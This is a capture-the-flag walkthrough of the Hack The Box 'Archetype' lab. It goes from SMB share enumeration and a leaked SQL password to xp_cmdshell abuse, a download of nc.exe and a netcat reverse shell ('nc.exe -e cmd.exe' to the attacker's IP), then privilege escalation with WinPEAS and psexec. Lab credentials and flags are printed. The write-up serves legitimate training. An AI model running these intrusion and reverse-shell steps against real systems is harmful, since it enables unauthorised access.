- - - 
created : 31-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

Which TCP port is hosting a database server?
## Rustscan/Nmap

We can use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ rustscan -a archetype.htb -- -A 

Open 10.129.52.2:135
Open 10.129.52.2:139
Open 10.129.52.2:445
Open 10.129.52.2:1433
Open 10.129.52.2:5985
Open 10.129.52.2:47001
Open 10.129.52.2:49665
Open 10.129.52.2:49664
Open 10.129.52.2:49666
Open 10.129.52.2:49667
Open 10.129.52.2:49668
Open 10.129.52.2:49669

PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM

 ms-sql-ntlm-info: 
|   10.129.52.2:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-08-01T17:18:26+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.52.2:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows Server 2016 (89%)
No exact OS matches for host (test conditions non-ideal).
```

We can see the answer is `1433`.
# Task 2

What is the name of the non-Administrative share available over [SMB](../../../../3%20-%20Tags/Hacking%20Concepts/SMB.md)?
## SMBclient

Using [SMBclient](../../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md)  : `smbclient -L` will list shares. Administrative shares end in $ :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ smbclient -L archetype.htb           
Password for [WORKGROUP\mdn0x]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC 
```

The answer is `backups`. 
# Task 3

What is the password identified in the file on the [SMB](../../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) share?

We can download the file with `smbclient //server/share -U username -c 'get remotefile.txt localfile.txt'` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$    smbclient //archetype.htb/backups  -c ls       
Password for [WORKGROUP\mdn0x]:
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                5056511 blocks of size 4096. 2516342 blocks available

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>             
```

We can see the password here.
# Task 4

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

```bash
  mssqlclient.py
```
# Task 5

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

```bash
  xp_cmdshell
```
# Task 6

What script can be used in order to search possible paths to escalate privileges on Windows hosts?

```bash
  WinPEAS
```
# Task 7

What file contains the administrator's password?

We have the password so first we download the [Script](../../../../3%20-%20Tags/Hacking%20Concepts/Script.md)  `mssqlclient.py`, in [Kali Linux](../../../../3%20-%20Tags/Hacking%20Tools/Kali%20Linux.md) we already have it and you can find it like this :
 
```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ locate   mssqlclient.py
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

Now we copy that to our working directory ( `.` means `in this dir`) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ cp /usr/share/doc/python3-impacket/examples/mssqlclient.py  .

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ ls                                                            
mssqlclient.py  prod.dtsConfig

```

Now we can learn how to use it : https://kosokoking.com/index.php/security/mssqlclient-py-sql-server-pen-testing-guide/

First we try to enter the system :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ python3 mssqlclient.py Archetype/sql_svc@archetype.htb -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password: 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

Let's try the xp_cmdshell :

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net-user'
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

So we need to activate it, first we check our role on the server :

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
    
-   
1   #True
```

So we are Admin users and we can activate the xp_cmdshell,

Follow these steps :
```
EXECUTE sp_configure 'show advanced options',1;  
RECONFIGURE;  
EXECUTE sp_configure 'xp_cmdshell',1;  
RECONFIGURE;
```

Now try running :

```
xp_cmdshell "whoami"
```

Now it’s working and this command will return us “archetype/sql_svc” :

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options',1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE; 
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell',1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc   

NULL                

```

We can stabilize the [Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Shell.md), read it about here :

https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/

We'll do `xp_cmdshell with nc`

First we locate `nc.exe` on our machine and copy that :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ locate nc.exe          
/home/mdn0x/THM/CHALLENGES/Easy/Cyberlens/web-server/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .    
```

Now we host a simple [Python](../../../../3%20-%20Tags/Programming%20Languages/Python.md) http web-server :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now we have to download it to our victim using these command :

```bash
xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:PORT/nc.exe -OutFile c:\\Users\Public\\nc.exe"
```

In my case :

```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell.exe wget http://10.10.14.231:8080/nc.exe -OutFile c:\\Users\Public\\nc.exe"
output   
------   
NULL     

```

And we see the hit on the server :

```bash
10.129.52.2 - - [01/Aug/2025 21:21:38] "GET /nc.exe HTTP/1.1" 200 -
```

Now we can open a [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

And we execute this command on the target :

```
xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe [Your_tun0_IP] YOUR_PORT"
```

In my case :

```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.231 1337"
```

And we have the connection on [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.231] from (UNKNOWN) [10.129.52.2] 49676
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
# Submit Flags
## User flag

We can move through the system with `dir` (`ls` eq for win), `cd` (moving in directories) and see files with `type` (`cat` eq for win) :

```powershell
Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,712,535,040 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
```
## Root flag

We need [Privilege Escalation](../../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to see the root flag, we'll use [WinPEAS](../../../../3%20-%20Tags/Hacking%20Tools/WinPEAS.md) to autpmatically search for vectors, first we locate it and copy it, if you don't have it you can download it here : [https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe] :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ locate winpeas         
/usr/bin/winpeas
/usr/share/applications/kali-winpeas.desktop
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/kali-winpeas.svg
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/winpeas.svg
/usr/share/icons/hicolor/16x16/apps/kali-winpeas.png
/usr/share/icons/hicolor/22x22/apps/kali-winpeas.png
/usr/share/icons/hicolor/24x24/apps/kali-winpeas.png
/usr/share/icons/hicolor/256x256/apps/kali-winpeas.png
/usr/share/icons/hicolor/32x32/apps/kali-winpeas.png
/usr/share/icons/hicolor/48x48/apps/kali-winpeas.png
/usr/share/icons/hicolor/scalable/apps/kali-winpeas.svg
/usr/share/kali-menu/applications/kali-winpeas.desktop
/usr/share/peass/winpeas
/usr/share/peass/winpeas/winPEAS.bat
/usr/share/peass/winpeas/winPEAS.ps1
/usr/share/peass/winpeas/winPEASany.exe
/usr/share/peass/winpeas/winPEASany_ofs.exe
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx64_ofs.exe
/usr/share/peass/winpeas/winPEASx86.exe
/usr/share/peass/winpeas/winPEASx86_ofs.exe

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .  
```

Now we can host again a server with [Python](../../../../3%20-%20Tags/Programming%20Languages/Python.md) in the same folder and download it from the target, we need to switch to PowerShell because cmd.exe doesn’t have `wget` :

```powershell
PS C:\Users\Public> wget http://10.10.14.231/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.14.231/winPEASx64.exe -outfile winPEASx64.exe

PS C:\Users\Public> dir
dir


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/19/2020  10:39 PM                Documents                                                             
d-r---        9/15/2018  12:12 AM                Downloads                                                             
d-r---        9/15/2018  12:12 AM                Music                                                                 
d-r---        9/15/2018  12:12 AM                Pictures                                                              
d-r---        9/15/2018  12:12 AM                Videos                                                                
-a----         8/1/2025  12:21 PM          59392 nc.exe                                                                
-a----         8/1/2025  12:40 PM       10155520 winPEASx64.exe         
```

Now we can run it :

```
PS C:\Users\Public> ./winPEASx64.exe

����������͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
    
```

Notice the file named **ConsoleHost_history.txt**, let’s see what’s in there :

```powershell
PS C:\Windows\system32> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

We have creds, now we need a tool to log in as Administrator on our target PC and we cannot do it directly in our [Windows](../../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) Powershell as we do in the Linux system. There is a tool from our impacket named **psexec.py** which will help us.

- Kill the PowerShell and mssqlclient on our machine.
- Let’s use our tool:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ locate psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
/usr/share/powershell-empire/empire/server/modules/powershell/lateral_movement/invoke_psexec.py
/usr/share/set/src/fasttrack/psexec.py

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Archetype]
└─$ cp /usr/share/doc/python3-impacket/examples/psexec.py .

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528

```

Pwned !!